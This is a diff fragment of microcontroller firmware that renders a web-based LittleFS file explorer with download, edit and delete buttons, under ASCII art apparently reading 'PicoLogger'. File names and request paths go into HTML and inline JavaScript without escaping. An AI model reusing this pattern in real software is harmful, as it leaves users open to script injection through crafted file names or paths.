+                      <a href="/explorer" onclick="toggleMenu()">File Explorer</a>
+                  </div>
+              </div>
+          </div>
+       <div class="ascii-container" align="center">
+            <pre class="ascii-art">
+   ___                 _                                  
+  (  _ \ _            ( )                                 
+  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
+  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
+  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
+  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
+                                  ( )_) | )_) |           
+                                   \___/ \___/            
+            </pre>
+        </div>
+        <div class="container">
+            <h2>LittleFS File Explorer</h2>
+            <div class="breadcrumb">Current Directory: )rawliteral" + generateBreadcrumb(path) + R"rawliteral(</div>
+            <table>
+                <tr><th>Name</th><th>Type</th><th>Size</th><th>Actions</th></tr>
+    )rawliteral";
+
+    if (path != "/") {
+        String parentPath = path.substring(0, path.lastIndexOf('/'));
+        if (parentPath == "") parentPath = "/";
+        html += "<tr><td colspan='4'><a class='folder-link' href='/explorer?path=" + parentPath + "'>.. (Up)</a></td></tr>";
+    }
+
+    Dir root = LittleFS.openDir(path);
+    while (root.next()) {
+        String fileName = root.fileName();
+        size_t fileSize = root.fileSize();
+        String fullPath = path + (path == "/" ? "" : "/") + fileName;
+
+        bool isDir = false;
+        File file = LittleFS.open(fullPath, "r");
+        if (file && file.isDirectory()) {
+            isDir = true;
+        }
+        file.close();
+
+        html += "<tr><td>";
+
+        if (isDir) {
+            html += "<a class='folder-link' href='/explorer?path=" + fullPath + "'>" + fileName + "/</a>";
+            html += "</td><td>Folder</td><td>-</td>";
+        } else {
+            html += fileName + "</td><td>File</td><td>" + String(fileSize) + " bytes";
+        }
+
+        html += "<td>";
+
+        if (!isDir) {
+            html += "<button onclick=\"location.href='/download?file=" + fullPath + "'\">Download</button>";
+            html += "<button onclick=\"location.href='/edit?file=" + fullPath + "'\">Edit</button>";
+            html += "<button onclick=\"confirmDelete('" + fullPath + "')\">Delete</button>";
+        }
+
+        html += "</td></tr>";
+    }
+
+    html += R"rawliteral(</table>
+        </div>
+        <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
+    </body>
+    </html>
+    )rawliteral";
+
+    server.send(200, "text/html", html);
 }
